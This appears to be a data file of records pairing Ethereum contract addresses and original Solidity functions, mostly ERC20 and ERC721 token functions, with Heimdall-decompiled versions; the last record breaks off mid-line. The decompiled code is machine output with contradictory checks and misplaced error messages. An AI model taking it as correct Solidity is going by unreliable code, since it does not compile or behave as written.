{"contract_address": "0xC2fc9ADEfFc2cF41f12d76ae9eB515289c4cfA6d", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) == (address(owner / 0x01)), \"SafeMath: addition overflow\");\n        require(bytes1(store_b / 0x010000000000000000000000000000000000000000), \"SafeMath: addition overflow\");\n        require(address(msg.sender) - 0, \"SafeMath: addition overflow\");\n        require(address(arg0) - 0, \"SafeMath: addition overflow\");\n        require(arg1 > 0, \"SafeMath: addition overflow\");\n        require(!(!(address(msg.sender)) == (address(owner / 0x01))), \"SafeMath: addition overflow\");\n        require(!(!(address(arg0)) == (address(owner / 0x01))), \"SafeMath: addition overflow\");\n        require(address(msg.sender) == (address(store_b / 0x01)), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_b / 0x01))), \"SafeMath: addition overflow\");\n        require(!(0 > 0), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_b / 0x01))), \"SafeMath: addition overflow\");\n        require(address(arg0) == (address(store_b / 0x01)), \"SafeMath: addition overflow\");\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_c[var_a] > (storage_map_c[var_a] + 0)), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((storage_map_c[var_a] + 0) < storage_map_c[var_a]), \"SafeMath: addition overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x1b;\n        var_h = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_c[var_a] = storage_map_c[var_a] + 0;\n        uint256 var_d = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        uint256 var_f = 0x40 + var_f;\n        var_d = 0x1e;\n        var_i = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_c[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_k = var_f.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(!((storage_map_c[var_a] - arg1) > storage_map_c[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_c[var_a] = storage_map_c[var_a] - arg1;\n        var_f = 0x40 + var_f;\n        var_j = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(0 > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_m = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_q = var_f.length;\n        uint256 var_r = 0;\n        var_s = var_n;\n        var_r = 0;\n        require(!((arg1 - 0) > arg1), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = 0xdead;\n        var_b = 0x01;\n        require(!(storage_map_c[var_a] > (storage_map_c[var_a] + 0)), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((storage_map_c[var_a] + 0) < storage_map_c[var_a]), \"SafeMath: addition overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x1b;\n        var_h = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        if (store_b / 0x0100000000000000000000000000000000000000000000) {\n        }\n        require(!(address(msg.sender) == (address(store_b / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(address(msg.sender) == (address(store_b / 0x01))), \"SafeMath: multiplication overflow\");\n        require(!(address(msg.sender) == (address(store_b / 0x01))), \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (_buyTax == ((arg1 * _buyTax) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * _buyTax) / arg1) == _buyTax, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x21;\n        var_h = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_k = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x40 + var_f;\n        var_d = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        if (0x64 > 0) {\n            if (0x64) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_c = 0x12;\n                if (!(address(arg0)) == (address(store_b / 0x01))) {\n                    if (!(address(arg0)) == (address(store_b / 0x01))) {\n                        var_a = address(this);\n                        var_b = 0x01;\n                        if (store_b / 0x01000000000000000000000000000000000000000000) {\n                            require(0x64 > 0, \"Exceeds the _maxTxAmount.\");\n                            require(0x64, \"Exceeds the _maxTxAmount.\");\n                            require(!(address(arg0) == (address(store_b / 0x01))), \"Exceeds the _maxTxAmount.\");\n                            require(!(address(arg0) == (address(store_b / 0x01))), \"Exceeds the _maxTxAmount.\");\n                        }\n                        require(!(!bytes1(store_b / 0x01000000000000000000000000000000000000000000)), \"Exceeds the _maxTxAmount.\");\n                    }\n                    require(!(!bytes1(store_b / 0x01000000000000000000000000000000000000000000)), \"Exceeds the _maxTxAmount.\");\n                }\n                require(!(!bytes1(store_b / 0x01000000000000000000000000000000000000000000)), \"Exceeds the _maxTxAmount.\");\n            }\n            require(!(!bytes1(store_b / 0x01000000000000000000000000000000000000000000)), \"Exceeds the _maxTxAmount.\");\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x19;\n        var_h = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_f / 0x01))) {\n            if (address(arg0) == (address(store_f / 0x01))) {\n            }\n        }\n        if (address(arg0) == (address(owner / 0x01))) {\n        }\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x29;\n        var_h = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_k = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_k = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_k = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x13;\n        var_h = 0x54726164696e67206973206e6f74206f70656e00000000000000000000000000;\n        require(address(msg.sender) == (address(owner / 0x01)), \"Trading is not open\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x13;\n        var_h = 0x54726164696e67206973206e6f74206f70656e00000000000000000000000000;\n    }"}
{"contract_address": "0x49e5FEE649E311efc2Cfb0f1f47e82CD90bECA13", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0);\n        require(address(arg0) - 0);\n        require(arg1 > 0);\n        require(address(msg.sender) == (address(owner / 0x01)));\n        require(address(arg0) == (address(owner / 0x01)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a] / 0x01));\n        require(!bytes1(storage_map_b[var_a] / 0x01));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_e == ((arg1 * store_e) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_e) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x21;\n        var_h = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_i = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_f = 0x40 + var_f;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_i = var_f.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_g / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_h / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        require(storage_map_b[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x49;\n        var_m = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(!(address(arg0)) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(arg0);\n        var_b = 0x03;\n        require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_i / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_i / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_i / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_i / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_i / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_e) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + ((arg1 * store_e) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(storage_map_b[var_a] + ((arg1 * store_e) / 0x64) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] + ((arg1 * store_e) / 0x64);\n        uint256 var_k = (arg1 * store_e) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_e) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_f = 0x40 + var_f;\n        var_k = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_f = 0x40 + var_f;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_e) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_p = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_u = var_f.length;\n        uint256 var_v = 0;\n        var_w = var_n;\n        var_v = 0;\n        if (!(arg1 - ((arg1 * store_e) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_k) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_i / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_m) {\n                if (arg1 - 0) {\n                }\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_e) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_m, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_g / 0x01))) {\n            if (address(arg0) == (address(store_g / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x29;\n        var_h = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_i = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x31d3341342D2A7a68EDDF5759C820eFD568D91dA", "original_solidity_code": "function getApproved(uint256 tokenId) public view virtual override returns (address) {\\n        require(_exists(tokenId), \\\"ERC721: approved query for nonexistent token\\\");\\n\\n        return _tokenApprovals[tokenId];\\n    }", "heimdall_decompiled_code": "function getApproved(uint256 arg0) public view returns (address) {\n        uint256 var_a = arg0;\n        var_b = 0x02;\n        require(address(storage_map_b[var_a]), \"ERC721: approved query for nonexistent token\");\n        var_a = arg0;\n        var_b = 0x04;\n        uint256 var_c = address(storage_map_b[var_a]);\n        return address(storage_map_b[var_a]);\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2c;\n        var_f = 0x4552433732313a20617070726f76656420717565727920666f72206e6f6e6578;\n        var_g = 0x697374656e7420746f6b656e0000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0D5bB4EE4e770C761F2F203c0828Eb2487A0Ab60", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0xB1C76Fbd9520964Be300A66679C3ac7dae32f744", "original_solidity_code": "function withdrawToken(address token) external onlyOwner{\r\n        require(address(this) != token, \"Not allowed\");\r\n        IERC20(token).safeTransfer(owner(), IERC20(token).balanceOf(address(this)));\r\n    }", "heimdall_decompiled_code": "function withdrawToken(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(this) - (address(arg0)));\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(this);\n        (bool success, bytes memory ret0) = address(arg0).Unresolved_70a08231(var_b); // staticcall\n        uint256 var_e = var_e + (uint248(ret0.length + 0x1f));\n        require(!(((var_e + ret0.length) - var_e) < 0x20), \"Address: insufficient balance for call\");\n        address var_d = address(owner);\n        uint256 var_f = var_e.length;\n        uint256 var_g = 0x44 + (var_e - var_e);\n        var_e = var_e + 0x64;\n        uint224 var_h = 0xa9059cbb00000000000000000000000000000000000000000000000000000000 | (uint224(var_i));\n        var_e = 0x40 + var_e;\n        var_j = 0x20;\n        var_k = 0x5361666545524332303a206c6f772d6c6576656c2063616c6c206661696c6564;\n        require(!(address(this).balance < 0), \"Address: insufficient balance for call\");\n        var_l = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_m = 0x20;\n        var_n = 0x26;\n        var_o = 0x416464726573733a20696e73756666696369656e742062616c616e636520666f;\n        var_p = 0x722063616c6c0000000000000000000000000000000000000000000000000000;\n        require(address(arg0).code.length, \"Address: call to non-contract\");\n        var_l = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_m = 0x20;\n        var_n = 0x1d;\n        var_o = 0x416464726573733a2063616c6c20746f206e6f6e2d636f6e7472616374000000;\n        uint256 var_o = 0;\n        (bool success, bytes memory ret0) = address(arg0).{ value: var_o ether }Unresolved_08c379a0(var_m); // call\n        require(ret0.length == 0);\n        require(!var_q);\n        var_l = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_m = 0x20;\n        uint256 var_n = var_e.length;\n        uint256 var_p = 0;\n        var_o = var_r;\n        var_p = 0;\n        require(!var_q, \"SafeERC20: ERC20 operation did not succeed\");\n        require(!(((0x80 + var_q) - 0x80) < 0x20), \"SafeERC20: ERC20 operation did not succeed\");\n        require(var_a == var_a, \"SafeERC20: ERC20 operation did not succeed\");\n        require(var_a, \"SafeERC20: ERC20 operation did not succeed\");\n        var_l = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_m = 0x20;\n        var_n = 0x2a;\n        var_o = 0x5361666545524332303a204552433230206f7065726174696f6e20646964206e;\n        var_p = 0x6f74207375636365656400000000000000000000000000000000000000000000;\n        var_e = var_e + (uint248(ret0.length + 0x3f));\n        uint256 var_l = ret0.length;\n        require(!var_e.length);\n        require(!var_e.length);\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0b;\n        var_d = 0x4e6f7420616c6c6f776564000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xeF684902f48bf76B9420474Aa213A8e217219674", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x10A7A2212f6b6ffE22d339D8Aa6e89a17ad8b1ad", "original_solidity_code": "function withdrawStuckEth(address toAddr) external onlyDev {\n        (bool success, ) = toAddr.call{value: address(this).balance}(\"\");\n        require(success);\n    }", "heimdall_decompiled_code": "function withdrawStuckEth(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(devWallet / 0x01)));\n        (bool success, bytes memory ret0) = address(arg0).transfer(address(this).balance);\n        require(ret0.length == 0);\n    }"}
{"contract_address": "0xF4DEF1F694801EaBF6f4B4b8b0209E617Bb224e8", "original_solidity_code": "function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {\r\n        _maxWalletSize = maxWalletSize;\r\n    }", "heimdall_decompiled_code": "function setMaxWalletSize(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _maxWalletSize = arg0;\n    }"}
{"contract_address": "0x8bD394Bd4b52207Df7a12F4a3EBF089e3d632826", "original_solidity_code": "function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {\\r\\n        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;\\r\\n        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), \\\"totalFee and sellFee cannot be more than 20%\\\");\\r\\n    }", "heimdall_decompiled_code": "function setTransactionRequirements(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5, uint256 arg6) public {\n        require(msg.sender == (address(getOwner)), \"!OWNER\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f574e45520000000000000000000000000000000000000000000000000000;\n        store_k = arg0;\n        store_o = arg1;\n        store_j = arg2;\n        store_p = arg3;\n        store_q = arg4;\n        store_r = arg5;\n        store_s = arg6;\n        require(0x01, \"totalFee and sellFee cannot be more than 20%\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!(!store_q > (store_i / 0x01)), \"totalFee and sellFee cannot be more than 20%\");\n        require(!(!store_q > (store_i / 0x01)), \"totalFee and sellFee cannot be more than 20%\");\n        require(!(store_q > (store_i / 0x01)), \"totalFee and sellFee cannot be more than 20%\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x2c;\n        var_d = 0x746f74616c46656520616e642073656c6c4665652063616e6e6f74206265206d;\n        var_g = 0x6f7265207468616e203230250000000000000000000000000000000000000000;\n        require(0x01);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(0x01);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0x3D93F860f4f6f4C54B79eDa0c09A1E70cc79947b", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\\n        return _balances[account];\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x0B544F7C213E8AE1383bee649a4af778Dd450DA5", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x0675693f486F11520F5b6814e290724cC6937312", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_d = arg1 + storage_map_b[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 